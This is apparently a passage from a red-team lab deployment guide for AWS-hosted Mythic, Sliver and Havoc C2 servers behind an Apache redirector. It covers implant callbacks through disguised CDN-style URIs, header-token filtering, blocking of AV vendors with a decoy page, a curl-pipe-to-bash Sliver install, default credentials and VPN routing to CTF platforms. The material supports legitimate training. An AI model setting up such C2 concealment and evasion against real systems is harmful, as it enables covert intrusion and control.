Replace `<YOUR_DOMAIN>` with your `redirector_domain` value from `terraform.tfvars`. The `/cloud/storage/objects/` prefix is stripped by the redirector before forwarding to Sliver.

> **Note:** The implant must also send the `X-Request-ID` header with the correct token value. Configure this in the Sliver HTTP C2 profile or use Sliver's `--header` flag if available.

Transfer the implant to the Windows workstation and execute it. You should see a new session appear in the Sliver console.

**Checkpoint:** ✅ Sliver implant calling back through redirector

### Step 5.5: Test Sliver Session

```text
sliver > sessions

sliver > use [SESSION_ID]

sliver (SESSION) > whoami
sliver (SESSION) > pwd
```

**Verify Redirector Traffic (on redirector via SSH):**

```bash
sudo tail -f /var/log/apache2/redirector-ssl-access.log
```

**Checkpoint:** ✅ Sliver C2 operational through redirector URI prefix /cloud/storage/objects/

---

## Part 6: Havoc C2 Setup

### Objective: Havoc Teamserver Configuration

Configure Havoc C2 teamserver and connect with the Havoc client.

### Step 6.1: Start Havoc Teamserver

**Via Guacamole:** Click **"Havoc C2 Server (SSH)"**

```bash
sudo systemctl start havoc
sudo systemctl status havoc
```

The teamserver starts on port 40056 with the default profile at `/opt/Havoc/profiles/default.yaotl`.

**Default Operator Credentials:**

- Username: `operator`
- Password: `Training123!`

**Checkpoint:** ✅ Havoc teamserver running on port 40056

### Step 6.2: Connect Havoc Client

The Havoc client is a Qt-based GUI application that runs on the Windows operator workstation.

**From the Windows Operator Workstation:**

1. Download the Havoc client from the [Havoc GitHub releases](https://github.com/HavocFramework/Havoc)
2. Connect to the teamserver:
   - **Host:** `havoc`
   - **Port:** `40056`
   - **Username:** `operator`
   - **Password:** `Training123!`

**Checkpoint:** ✅ Havoc client connected to teamserver

### Step 6.3: Create Listener and Generate Demon

**In the Havoc client:**

1. Navigate to: Listeners → Add
2. The default profile already includes an HTTP listener on port 80
3. The redirector forwards traffic from the `/edge/cache/assets/` URI prefix to this listener

**Generate a Demon (Havoc implant):**

1. Navigate to: Payloads → Generate
2. Configure the callback host as `https://<YOUR_DOMAIN>/edge/cache/assets/` (your redirector domain)
3. Ensure the implant sends the `X-Request-ID` header with the correct token value (from `terraform output deployment_info`)
4. Generate and transfer to the Windows workstation

**Checkpoint:** ✅ Havoc Demon calling back through redirector URI prefix /edge/cache/assets/

---

## Part 7: Final Validation

### Objective: Complete Infrastructure Validation

Verify complete infrastructure and security posture.

### Step 7.1: Test Security Isolation

**Critical Test - C2 Servers Should NOT Be Directly Accessible:**

All three C2 servers (Mythic, Sliver, Havoc) have no public IPs and are unreachable from the internet by design. They can only be accessed internally via Guacamole or through the redirector's VPC peering.

**Expected:** No C2 server has a public IP. All C2 traffic must flow through the Apache redirector.

**Checkpoint:** ✅ C2 servers not directly accessible (GOOD!)

**Verify Redirector CAN Reach All C2 Servers (run on the redirector via SSH):**

```bash
# Use a browser User-Agent — curl is blocked by redirect.rules
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Test direct backend connectivity (hostnames resolve via /etc/hosts on the redirector)
curl -I -m 5 -A "$UA" http://mythic/
curl -I -m 5 -A "$UA" http://sliver/
curl -I -m 5 -A "$UA" http://havoc/
```

**Expected:** `curl: (7) Failed to connect` (no listener running yet) — this is correct. Verify ping works to confirm VPC peering:

```bash
ping -c 3 mythic
```

**Checkpoint:** ✅ Redirector can ping all C2 servers via private IPs (VPC peering confirmed)

### Step 7.2: Verify All Agent Callbacks

**Check across all C2 frameworks:**

- Mythic: Active Callbacks page in the web UI
- Sliver: `sessions` command in the Sliver console
- Havoc: Active sessions in the Havoc client

**Checkpoint:** ✅ All C2 callback paths functional

### Step 7.3: Review Redirector Logs

**All C2 traffic flows through the redirector:**

```bash
# SSH to redirector
ssh -i rs-rsa-key.pem admin@<REDIR_PUBLIC_IP>

# HTTPS traffic (C2 callbacks)
sudo tail -20 /var/log/apache2/redirector-ssl-access.log

# HTTP traffic
sudo tail -20 /var/log/apache2/redirector-access.log

# Differentiate by URI prefix:
# /cdn/media/stream/ = Mythic
# /cloud/storage/objects/ = Sliver
# /edge/cache/assets/ = Havoc
```

**Checkpoint:** ✅ Redirector logging understood for all C2 servers

### Step 7.4: Document Deployment

```bash
# Run on the redirector (SSH'd in)
cat > ~/deployment_summary.txt <<EOF
REDSTACK DEPLOYMENT COMPLETE
========================
Deployment Date: $(date)

INFRASTRUCTURE (6 EC2 instances):
- Mythic C2:    internal only (access via Guacamole)
- Sliver C2:    internal only (access via Guacamole)
- Havoc C2:     internal only (access via Guacamole)
- Guacamole:    <GUAC_PUBLIC_IP> (public)
- Windows:      internal only (RDP via Guacamole)
- Redirector:   <REDIR_PUBLIC_IP> (public)

REDIRECTOR URI ROUTING (all on ports 80/443):
- /cdn/media/stream/       -> Mythic
- /cloud/storage/objects/  -> Sliver
- /edge/cache/assets/      -> Havoc

CREDENTIALS:
- All credentials in: terraform output deployment_info
- Mythic admin password: sudo cat /opt/Mythic/.env | grep MYTHIC_ADMIN_PASSWORD
- Havoc: operator / Training123!

STATUS: All systems operational
EOF

cat ~/deployment_summary.txt
```

**Checkpoint:** ✅ Deployment documented

---

## Troubleshooting

### redirect.rules Download Fails (Private Repo)

**Symptoms:** Apache fails to start, `apache2ctl -S` shows:

```text
Invalid command '404:', perhaps misspelled or defined by a module not included
```

**Root Cause:** The redirector downloads `redirect.rules` from the GitHub repo at boot using `curl`. If the repo is private, GitHub returns a `404: Not Found` response body which gets saved as the file. Apache then fails to parse it.

**Verify:**

```bash
head -3 /etc/apache2/redirect.rules
# Will show: "404: Not Found"
```

**Fix — Copy the file manually from your local machine:**

**Windows (PowerShell):**

```powershell
scp -i ".\rs-rsa-key.pem" `
    ".\setup_scripts\redirect.rules" `
    admin@<REDIR_PUBLIC_IP>:/tmp/redirect.rules
```

**Linux/Mac (bash):**

```bash
scp -i rs-rsa-key.pem setup_scripts/redirect.rules admin@<REDIR_PUBLIC_IP>:/tmp/redirect.rules
```

**Then on the redirector:**

```bash
sudo cp /tmp/redirect.rules /etc/apache2/redirect.rules
sudo apache2ctl configtest && sudo systemctl reload apache2
```

**Permanent Fix:** Make the GitHub repo public, or the setup script will need updating to embed the file directly.

---

### Mythic nginx SSL Certificate Missing

**Symptoms:** `mythic_nginx` container keeps restarting. Logs show:

```text
[emerg] cannot load certificate "/etc/ssl/private/mythic-cert.crt": No such file or directory
```

**Root Cause:** Mythic's `mythic-cli start` generates SSL certificates, but the setup script was previously running it as the `admin` user which cannot write to `/etc/ssl/private/` (root-owned). This is fixed in current versions of the setup script.

**Fix — Generate the cert manually:**

```bash
sudo openssl req -x509 -newkey rsa:4096 \
  -keyout /etc/ssl/private/mythic-cert.key \
  -out /etc/ssl/private/mythic-cert.crt \
  -days 365 -nodes -subj "/CN=mythic"

cd /opt/Mythic
sudo ./mythic-cli restart
```

**Verify:**

```bash
sudo ./mythic-cli status
# mythic_nginx should now show "running (healthy)"
```

---

### Guacamole Connections Not Auto-Created

**Symptoms:** Some or all of the 6 connections don't appear in Guacamole UI after deployment

**Root Cause:** Previous versions had a bug where the setup script used incorrect database backend ('mysql' instead of 'postgresql')

**Solution:**

```bash
# SSH to Guacamole server
ssh -i rs-rsa-key.pem admin@<GUAC_PUBLIC_IP>

# Check if connections exist
docker exec -it postgres_guacamole psql -U guacamole_user -d guacamole_db \
  -c "SELECT connection_id, connection_name, protocol FROM guacamole_connection;"
```

**Expected:** Should show 6 connections (1 RDP, 5 SSH)

**If Missing, Manually Create via Guacamole UI:**

1. Log into Guacamole web UI
2. Settings (top right) → Connections → New Connection

**SSH Connections (for any missing C2 server):**

- Name: `Sliver C2 Server (SSH)` or `Havoc C2 Server (SSH)`
- Protocol: SSH
- Hostname: Private IP from `terraform output deployment_info`
- Port: 22
- Username: admin
- Password: from `terraform output deployment_info`

**Fixed in Current Version:** The setup script correctly creates all 6 connections automatically

---

### Mythic Not Starting

**Symptoms:** mythic-cli status shows containers not running

**Solution:**

```bash
# Preferred: use Guacamole "Mythic C2 Server (SSH)" connection
# Or jump via redirector from your machine:
ssh -i rs-rsa-key.pem -J admin@<REDIR_PUBLIC_IP> admin@mythic

cd /opt/Mythic
sudo ./mythic-cli logs  # Check for errors
sudo ./mythic-cli restart
```

**Common Issues:**

- Docker still pulling images (wait 5 min)
- Port conflicts (check: `sudo netstat -tlnp`)
- Memory issues (upgrade to t3.large)
- Missing SSL cert — see [Mythic nginx SSL Certificate Missing](#mythic-nginx-ssl-certificate-missing)

---

### Sliver Not Installed

**Symptoms:** `sliver-server` command not found

**Solution:**

```bash
# Check user-data log
sudo cat /var/log/user-data.log

# Re-run installation
curl https://sliver.sh/install | sudo bash
```

---

### Havoc Build Failed

**Symptoms:** Havoc teamserver binary not found or service fails to start

**Solution:**

```bash
# Check user-data log
sudo cat /var/log/user-data.log

# Check Go installation
/usr/local/go/bin/go version

# Rebuild manually
cd /opt/Havoc/teamserver
sudo -E /usr/local/go/bin/go build -o teamserver .

# Start manually to see errors
./teamserver server --profile /opt/Havoc/profiles/default.yaotl
```

---

### Guacamole RDP Fails

**Symptoms:** Can't connect to Windows via Guacamole

**Solution:**

```bash
# Check Guacamole logs
ssh -i rs-rsa-key.pem admin@<GUAC_PUBLIC_IP>
docker logs guacamole

# Test RDP connectivity (run from Guacamole server — hostname resolves via /etc/hosts)
nc -zv win-operator 3389
```

**Common Issues:**

- Windows still setting up (wait 10 min)
- Security group misconfiguration
- Guacamole didn't auto-configure connection

---

### Agent Won't Callback

**Symptoms:** Agent executes but no callback in Mythic/Sliver/Havoc

**Checklist:**

- [ ] Listener is running on the C2 server
- [ ] Callback Host and Port match the redirector's domain/IP and port 443
- [ ] Agent sends the correct `X-Request-ID` header with the auto-generated token
- [ ] Agent URI uses the correct prefix (`/cdn/media/stream/`, `/cloud/storage/objects/`, or `/edge/cache/assets/`)
- [ ] Redirector Apache is running with all VirtualHosts enabled
- [ ] Redirector can reach the C2 server's private IP (test with ping)
- [ ] Agent user-agent is not blocked by redirect.rules (check for known scanner/AV strings)

**Debug (on redirector via SSH):**

```bash
sudo apache2ctl -S
systemctl status apache2

# Check logs (differentiate by URI prefix)
sudo tail -100 /var/log/apache2/redirector-ssl-access.log
sudo tail -100 /var/log/apache2/redirector-ssl-error.log

# Run the pre-installed test script
sudo /root/test_redirector.sh
```

---

### Terraform Errors

**Error:** `InvalidKeyPair.NotFound`

```bash
# List available keys
aws ec2 describe-key-pairs --query 'KeyPairs[].KeyName'
# Update terraform.tfvars with correct name
```

**Error:** `VPC limit exceeded`

```bash
# Use default VPC instead
# In terraform.tfvars: use_default_vpc = true
```

---

## Post-Deployment Actions

### Cleanup (When Done)

```bash
terraform destroy
# Type 'yes' to confirm

# Verify removal
aws ec2 describe-instances --filters "Name=tag:Project,Values=redstack"
```

### Cost Management

**Stop instances when not in use via AWS Console:**

1. AWS Console → EC2 → Instances
2. Select all redStack instances
3. Instance State → Stop

**Or via AWS CLI** (get instance IDs from AWS Console or `aws ec2 describe-instances`):

```bash
aws ec2 stop-instances --instance-ids i-xxxxx i-yyyyy i-zzzzz
```

---

## Success Criteria

At the end of this deployment, you should have:

- ✅ All 6 EC2 instances running and accessible
- ✅ 2 VPCs with peering configured
- ✅ Apache redirector with header validation, URI routing, and redirect.rules
- ✅ Mythic C2 server isolated (no public IP, internal only)
- ✅ Sliver C2 server isolated (no public IP, internal only)
- ✅ Havoc C2 server isolated (no public IP, internal only)
- ✅ Mythic HTTP listener configured through redirector (/cdn/media/stream/)
- ✅ Sliver HTTP listener configured through redirector (/cloud/storage/objects/)
- ✅ Havoc HTTP listener configured through redirector (/edge/cache/assets/)
- ✅ Header validation (X-Request-ID) filtering unauthorized requests
- ✅ redirect.rules blocking AV vendors and TOR exits (403); cloud IPs commented out for AWS compatibility
- ✅ Decoy page served for requests without valid C2 header
- ✅ At least 1 active agent callback per C2 framework
- ✅ Can execute commands through all C2 paths
- ✅ All 6 Guacamole connections auto-created (1 RDP, 5 SSH)
- ✅ Guacamole providing web-based access to all infrastructure components
- ✅ SSH password authentication working from C2 VPC, keys required from public IPs
- ✅ Windows workstation with Chromium, VS Code, MobaXterm, and 7-Zip installed
- ✅ Windows Administrator accessible via Guacamole (AWS-generated password auto-configured)

**Your Boot-to-Breach lab environment is operational.**

---

## Part 8: External Target Environments (HTB/THM/ProvingGrounds)

### Objective: Connect Lab to External CTF Platforms

Route traffic from your internal lab machines (Windows workstation, C2 servers) to external target environments like HackTheBox, TryHackMe, or Proving Grounds through the Apache redirector's OpenVPN tunnel.

### How It Works

```text
+---------------------------------------------------------------------+
|                     VPN ROUTING ARCHITECTURE                        |
+---------------------------------------------------------------------+

Traffic Flow:
[Windows/C2 Servers] -> Main VPC route table (10.10.0.0/16 -> VPC peering)
  -> Redirector VPC route table (10.10.0.0/16 -> redirector ENI)
  -> Redirector (iptables MASQUERADE on tun0)
  -> OpenVPN tunnel -> HTB/THM/PG targets

The redirector acts as a NAT gateway: internal machines send traffic
to CTF target IPs, which gets routed through VPC peering to the
redirector, then masqueraded out the VPN tunnel.
```

### Step 8.1: Enable VPN Routing Before Deployment

**This must be configured before running `terraform apply`.**

Edit `terraform.tfvars` and set:

```hcl
enable_external_vpn = true
```

This enables the following infrastructure changes:

- Installs OpenVPN client on the redirector
- Enables IP forwarding on the redirector
- Disables AWS `source_dest_check` on the redirector (required for packet forwarding)
- Adds VPC routes for CTF target CIDRs (default: `10.10.0.0/16`) through the redirector
- Adds security group rules allowing forwarded traffic from the main VPC

**Custom Target CIDRs (optional):**

The default routed CIDR is `10.10.0.0/16` which covers most HTB/THM lab ranges. If your target platform uses different ranges, add them in `terraform.tfvars`:

```hcl
enable_external_vpn = true
external_vpn_cidrs  = ["10.10.0.0/16", "10.200.0.0/16"]
```

> **Note:** If you already deployed without `enable_external_vpn = true`, you can enable it and run `terraform apply` again. Terraform will add the required routes, security group rules, and update the redirector instance.

### Step 8.2: Deploy and Obtain Your .ovpn File

1. Deploy the infrastructure with `terraform apply`
2. Download your `.ovpn` file from your CTF platform (HTB, THM, or Proving Grounds)

### Step 8.3: Upload the .ovpn File to the Redirector

Get the redirector public IP from `terraform output deployment_info`, then:

**Windows (PowerShell):**

```powershell
scp -i ".\rs-rsa-key.pem" "C:\path\to\lab.ovpn" admin@<REDIR_PUBLIC_IP>:~/vpn/
```

**Linux/Mac (bash):**

```bash
scp -i rs-rsa-key.pem lab.ovpn admin@<REDIR_PUBLIC_IP>:~/vpn/
```

**Or via Guacamole:**

1. Open the **"Apache Redirector (SSH)"** connection in Guacamole
2. Transfer the `.ovpn` file using Guacamole's file transfer feature

### Step 8.4: Start the VPN Tunnel

**SSH to the redirector:**

```bash
ssh -i rs-rsa-key.pem admin@<REDIR_PUBLIC_IP>
```

**Start the VPN:**

```bash
sudo ~/vpn.sh start ~/vpn/lab.ovpn
```

This will:

- Copy the `.ovpn` file to a persistent location (`~/vpn/external.ovpn`)
- Start OpenVPN with `--pull-filter ignore "redirect-gateway"` (critical: prevents the VPN from hijacking the redirector's default route, which would break all VPC peering and C2 proxy connectivity)
- Wait for the `tun0` interface to come up
- Configure iptables MASQUERADE rules for NAT

**Check VPN status:**

```bash
sudo ~/vpn.sh status
```

This shows the tunnel state, VPN IP, and active NAT rules.

### Step 8.5: Verify Connectivity from Internal Machines

**From the Windows operator workstation (via Guacamole RDP):**

```powershell
# Ping a target on the CTF network
ping 10.10.10.2

# Or run nmap, etc.
nmap -sC -sV 10.10.10.2
```

**From any C2 server (via Guacamole SSH):**

```bash
ping 10.10.10.2
```

Traffic from any internal machine destined for the CTF target CIDRs is automatically routed through the redirector's VPN tunnel.

### Step 8.6: Stop the VPN

```bash
sudo ~/vpn.sh stop
```

This kills the OpenVPN process and removes the iptables MASQUERADE rules. The `.ovpn` config file is preserved at `~/vpn/external.ovpn` so you can restart without re-uploading.

### Important Notes

- **The VPN does NOT affect C2 operations.** The `--pull-filter ignore "redirect-gateway"` flag ensures only CTF target traffic goes through the tunnel. All VPC peering, Apache proxy, and C2 callback traffic continues to work normally.
- **Only the configured CIDRs are routed.** By default, only `10.10.0.0/16` is routed through the VPN. Traffic to other destinations (internet, VPC peers) is unaffected.
- **The .ovpn file persists across reboots** in `~/vpn/external.ovpn`. However, the VPN tunnel itself does not auto-start — you must run `sudo ~/vpn.sh start` after a reboot.
- **All internal machines can reach CTF targets.** The routing is configured at the VPC level, so the Windows workstation, all C2 servers, and the Guacamole server can all reach targets through the VPN tunnel.

**Checkpoint:** Lab connected to external target environment, all internal machines can reach CTF targets
